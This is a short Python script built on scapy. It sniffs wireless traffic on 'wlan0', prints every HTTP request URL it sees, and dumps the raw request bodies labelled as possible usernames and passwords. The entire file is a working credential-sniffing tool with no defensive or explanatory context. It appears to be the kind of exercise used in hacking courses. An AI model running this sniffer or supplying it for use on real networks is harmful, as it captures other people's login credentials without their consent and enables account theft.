#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP request >> " + str(url))
        if packet.haslayer(scapy.Raw):
            try:
                load = packet[scapy.Raw].load.decode(errors="ignore")
                print("[+] Possible username/password >> " + load)
            except:
                pass

sniff("wlan0")
